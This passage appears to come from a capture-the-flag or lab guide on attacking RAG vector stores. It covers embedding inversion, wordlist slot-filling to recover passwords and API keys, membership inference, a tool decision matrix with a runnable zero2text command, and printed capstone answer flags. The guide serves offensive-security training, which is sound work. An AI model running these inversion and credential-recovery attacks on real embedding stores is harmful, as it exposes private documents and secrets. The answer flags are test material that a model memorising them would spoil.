│  (Refinement)     │  Iterative correction (3–5 rounds)
│                   │  Output: "The default password after resetting is N0=Acc3ss"
└───────────────────┘
```

**Key properties:**
- Corrector attends to the **residual** (original_embedding − encode(approx_text)) — focuses correction effort on what the inverter got wrong
- ~15 minutes per chunk on GPU
- Requires (text, embedding) pairs from the exact target model for training (~60 hours)
- After training, uses **recon-guided template selection**: inverter output guides which templates to use in progressive fill-and-lock

**Progressive fill-and-lock:**
1. Inverter produces approximate text → slot positions identified
2. Fill `{PASSWORD}` slot with top-100 wordlist entries → score against target
3. Lock the top-1 candidate → fix that slot → move to next slot
4. Repeat for each slot (URL, API_KEY, etc.)
5. Final output: fully reconstructed sentence with all slots filled

---

### Decision Matrix — Which Inversion Tool to Use

```
                    START
                      │
          ┌───────────▼───────────┐
          │  Is the embedding     │
          │  model known/         │
          │  fingerprinted?       │
          └───────┬───────────────┘
                  │
       ┌──────────┴──────────┐
      YES                    NO
       │                     │
       ▼                     ▼
┌─────────────┐     ┌──────────────────┐
│ emb_fin.py  │     │  Do you have     │
│ (default,   │     │  RAG query       │
│  no GPU)    │     │  endpoint access?│
│             │     └────────┬─────────┘
│ If sim <0.7 │             │
│  → zero2text│     ┌───────┴────────┐
└─────────────┘    YES              NO
                    │               │
                    ▼               ▼
            ┌────────────┐  ┌──────────────┐
            │ ALGEN      │  │  Surrogate/  │
            │ (canary +  │  │  Transfer    │
            │ rag_probe) │  │  Attack      │
            └─────┬──────┘  └──────────────┘
                  │
     ┌────────────┴────────────┐
     │  Long engagement?       │
     │  GPU available?         │
     └────────────┬────────────┘
                  │
       ┌──────────┴──────────┐
      YES                    NO
       │                     │
       ▼                     ▼
┌─────────────┐      ┌──────────────┐
│  Vec2Text   │      │  ALGEN only  │
│  (~60hr     │      │  (2hr, CPU)  │
│  training)  │      └──────────────┘
└─────────────┘
```

**Quick reference:**

| Situation | Tool |
|---|---|
| Known model, no GPU, time-limited | `emb_fin.py` (default) |
| Known model, low template similarity | `zero2text_impl.py` |
| Unknown model, RAG query access | `ALGEN` + `rag_probe_attack.py` |
| Known model, GPU, long engagement | `Vec2Text` |
| Unknown model, no RAG access | Surrogate/transfer attack |

**Capstone answers:** `N0=Acc3ss` (PasswordResetPolicy chunk) | `superman` (final flag)

---

### Membership Inference — Mechanics

Membership inference (AML.T0024.000) answers: "Is this specific text in the vector store?" without reading the store directly. Used to confirm that a document known from another source was indexed.

**emb_fin.py membership inference mechanics:**
1. **Attractor candidates**: encode known text variants using target model → compute cosine similarity to stored vectors → if any vector has similarity ≥ 0.97, text is almost certainly indexed
2. **Adaptive selection**: if first probe is ambiguous (0.85–0.96 sim), generate semantically adjacent variants → re-score → if any adjacent variant exceeds threshold, confirm membership
3. **Diversity clustering**: cluster probes (cosine threshold 0.85) to avoid counting near-duplicate probes as independent evidence
4. **Two-stage narrowing**: coarse pass on full corpus → fine-grained pass on top-50 candidates
5. **Margin-aware scoring**: confidence = (top1_sim − top2_sim); HIGH ≥ 0.15, MODERATE 0.08–0.15, LOW < 0.08

**False positive avoidance:**
- HIGH confidence only when margin ≥ 0.15 AND at least 2 independent probes confirm
- LOW margin → report as "possible membership, not confirmed"
- Wordlist size matters: larger wordlist = more true candidates but more noise

---

### zero2text_impl.py — Beam Search Mechanics

zero2text_impl.py extends the Zero2Text approach (arXiv 2602.01757v2) with GPT-2 as the decoder.

**How it works:**
1. Load GPT-2 (medium by default) + target embedding model
2. **Dual-embedder mode**: generate candidate tokens from GPT-2 → embed both with GPT-2's own embedder AND with the target model → score against target vector using both → weighted combination
3. **Beam search**: maintain beam of width B (default 5) → at each step extend each beam by top-K tokens → prune by combined score → repeat for max_tokens steps
4. **Entropy detection**: compute Shannon entropy of GPT-2 token probability distribution — high entropy at a position → token is a credential (not natural language) → switch to slot filling at that position
5. **Slot filling trigger**: when entropy > threshold, pause beam search → insert wordlist candidates into slot → score each → resume beam search from highest-scoring candidate

**Command:**
```bash
python3 zero2text_impl.py \
  --embedding-file embeddings.npy \
  --chunk-id 7 \
  --model-path /root/.cache/huggingface/hub/models--sentence-transformers--all-MiniLM-L6-v2 \
  --wordlist passwords.txt \
  --beam-width 5 \
  --max-tokens 64
```
